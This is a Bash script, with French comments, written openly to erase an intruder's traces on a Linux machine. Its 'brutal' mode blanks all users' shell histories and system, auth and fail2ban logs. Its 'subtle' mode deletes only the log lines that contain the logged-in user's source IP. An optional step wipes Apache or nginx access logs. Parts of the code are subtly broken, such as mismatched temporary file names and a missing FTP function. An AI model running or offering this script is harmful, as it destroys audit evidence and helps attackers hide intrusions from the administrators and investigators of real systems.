#!/bin/bash

#.  Description : Script to clear all tracks on a Linux Machine
#.  mode bourrin -b qui clear tout et -s "subtil way"

usage() {

  script_name=$(basename $0)
  echo -e "This is the list of available options: "
  echo -e "\t  -b : The brutal way of clearing logs."
  echo -e "\t  -s : The subtil way of clearing logs."
}

brutal_way() {
echo "Cleaning all logs..."
history -cw
echo " " > /root/.*history
echo " " > /var/log/syslog
echo " " > /var/log/auth.log
echo " " > /var/log/user.log
echo " " > /var/log/messages

##Effacer tous les bash_history de tous les users à la sauvage
users=$(ls /home/)
tab=($users)
for i in "${tab[@]}"
do
  echo " " > /home/${i}/.*history

done

if [ -f /var/log/fail2ban.log ]
then
  echo " " > /var/log/fail2ban.log
fi

}

subtil_way() {
from=$(who | cut -d"(" -f2 | cut -d")" -f1 | tail -1)

##On récupère tous les fichiers logs qui contiennent l'IP de provenance et on efface les lignes correspondantes

echo "Cleaning all logs..."
find /var/log/ -type f -exec grep -H "${from}" {} \; > /tmp/tmp.txt
sed 's/\/var\/log/\n&/g' /tmp/tmp.txt > /tmp/tmp2.txt
cat /tmp/tmp2.txt | awk -F ':' '{print $1}' | sort -u > /tmp/log_files.txt
sed -i '/^$/d' /tmp/log_files.txt
cat /tmp/log_files.txt | grep /var | while read line
do
  sed -i "/${from}/d" $line > /dev/null 2>&1
done

if [ -f /var/log/fail2ban.log ]
then
  sed -i "/${from}/d" /var/log/fail2ban.log > /dev/null 2>&1
fi


read -p "Do you want to clear HTTP logs [Yes/no] ?" -n 1 -r
echo ""
if [[ $REPLY =~ ^[Yy]$ ]]; then
  clear_http
  clear_http
else
  echo "HTTP logs won't be cleaned"
fi

read -p "Do you want to clear FTP logs [Yes/no] ?" -n 1 -r
echo ""
if [[ $REPLY =~ ^[Yy]$ ]]; then
  clear_ftp
else
  echo "FTP logs won't be cleaned"
fi

}

clear_http() {
##Efface toutes les lignes dans le access_log, à voir pour rajouter le error
web_server=$(lsof -i | grep LISTEN | grep http | head -n 1 | awk '{print $1}')
case ${web_server} in
  apache2)
    apache2_RHEL_dir="/etc/httpd/"
    apache2_DEB_dir="/etc/apache2/"
    if [ -d ${apache2_RHEL_dir} ];then
      grep access.log ${apache2_RHEL_dir}/conf.d/* > /tmp/vhost_logs.txt
      cat /tmp/vhosts_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
      ##Mode bourrin : ON
      cat /tmp/vhost_logs2.txt | while read line
        do
          echo "${line}"
        done
    
     elif [ -d ${apache2_DEB_dir} ];then
      grep access.log ${apache2_DEB_dir}/sites-enabled/* > /tmp/vhost_logs.txt
      cat /tmp/vhosts_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
      ##Mode bourrin : ON
      cat /tmp/vhost_logs2.txt | while read line
        do
          ##On enlève toutes les lignes dans les logs
          echo " " > "${line}"
        done
    fi
    ;;
  nginx)
    nginx_dir="/etc/nginx/"
    if [ -d ${nginx_dir} ]; then
      grep access.log ${nginx_dir}/sites-enabled/* > /tmp/vhost_logs.txt
      cat /tmp/vhosts_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
      ##Mode bourrin : ON
      cat /tmp/vhost_logs2.txt | while read line
        do
          ##On enlève toutes les lignes dans les logs
          echo " " > "${line}"
        done
    fi
    ;;
  *)
   echo "Unknown web server. Script will exit."
   exit 1
   ;;
esac

}

:<<COM
clear_ftp() {

}
COM

if [ -z ${1} ]
then
  usage
fi

while getopts "bs" opt; do
  case $opt in
    b) brutal_way
      ;;
    s) subtil_way
      ;;
  esac
done

exit 0
